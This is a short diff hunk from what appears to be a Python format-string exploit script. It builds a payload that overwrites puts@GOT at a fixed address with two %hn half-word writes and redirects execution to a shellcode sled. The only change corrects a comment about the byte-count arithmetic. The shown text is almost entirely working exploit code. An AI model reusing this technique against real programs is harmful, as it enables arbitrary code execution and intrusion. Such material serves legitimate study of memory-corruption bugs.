@@ -40,7 +40,7 @@ egg = EGG_addr + 20000                     # sled midpoint
 lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh typically 0xffff
 got = 0x0804b218
 payload  = pack(got) + pack(got+2)          # addresses at offsets 1 and 2
-payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (4 + (lh-8) = lh)
+payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (8 address bytes + (lh-8) = lh)
 payload += b'%.{hh-lh}x%2$hn'               # puts@GOT+2 = hh
 # fgets reads from stdin -> payload+"\n", wait (printf prints ~64KB), puts->shellcode, timed command
 ```
